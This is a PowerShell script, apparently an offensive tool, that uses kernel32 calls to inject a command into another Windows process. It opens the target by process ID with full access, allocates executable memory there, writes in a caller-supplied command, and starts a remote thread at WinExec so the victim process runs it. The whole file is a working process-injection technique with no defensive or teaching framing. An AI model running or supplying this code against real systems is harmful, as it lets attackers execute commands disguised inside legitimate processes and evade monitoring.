param (
	[int]$processId,
	[string]$cmd
)

$kernel32 = @"
using System;
using System.Text;
using System.Runtime.InteropServices;

public class Win32 {
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwprocessId);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type -TypeDefinition $kernel32 -PassThru | Out-Null

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40

$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
if ($hProcess -eq [IntPtr]::Zero) {
	Write-Error " [!] Failed to open process $processId"
	exit 1
}

Write-Output " [+] Successfully opened process ID: $processId"

$command = $cmd
$commandBytes = [System.Text.Encoding]::ASCII.GetBytes($command + "`0")

$remoteMemory = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$commandBytes.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
if ($remoteMemory -eq [IntPtr]::Zero) {
	Write-Error " [!] Failed to allocate memory in remote process."
	exit 1
}

Write-Output (" [>] Allocated memory at: 0x{0:X}" -f $remoteMemory)

$bytesWritten = [IntPtr]::Zero
$writeSuccess = [Win32]::WriteProcessMemory($hProcess, $remoteMemory, $commandBytes, [uint32]$commandBytes.Length, [ref]$bytesWritten)
if (-not $writeSuccess) {
	Write-Error " [!] Failed to write process memory."
	exit 1
}

Write-Output " [+] Wrote command string into remote process memory."

$hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
$WinExecAddr = [Win32]::GetProcAddress($hKernel32, "WinExec")

if ($WinExecAddr -eq [IntPtr]::Zero) {
	Write-Error " [!] Failed to get WinExec address."
	exit 1
}

Write-Output ( " [>] WinExec Address: 0x{0:X}" -f $WinExecAddr)

$remoteThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $WinExecAddr, $remoteMemory, 0, [IntPtr]::Zero)

if ($remoteThread -eq [IntPtr]::Zero) {
	Write-Error " [!] Failed to create remote thread."
	exit 1
}

Write-Output " [+] Successfully created remote thread in PID $processId. Process should now execute '$command'."
